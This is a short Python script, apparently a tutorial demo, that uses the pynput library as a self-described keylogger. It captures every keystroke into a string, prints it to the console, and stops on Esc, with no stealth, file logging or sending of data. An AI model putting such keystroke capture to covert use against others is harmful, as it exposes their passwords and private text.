# Import required libraries
from pynput import keyboard
from pynput.keyboard import Key, Listener

# Declare global variable text to store the key values
text = 'Welcome to keylogger'

# Define function onPress to detect the key values on button press
def onPress(key):
    global text
    # Based on the key press we handle the way the key gets logged to the in memory string.
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.cmd_r:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
    print(text)

# Define function onRelease to detect the key values on button press
def onRelease(key):
    if key == Key.esc:
        return False


# Create listners to listen keyboard events
with Listener(on_press=onPress, on_release=onRelease) as listener:
    print("!!! WELCOME TO KEYLOGGER APP !!!")
    print("!!! APP IS READY TO LISTEN THE KEYS !!!")
    listener.join()
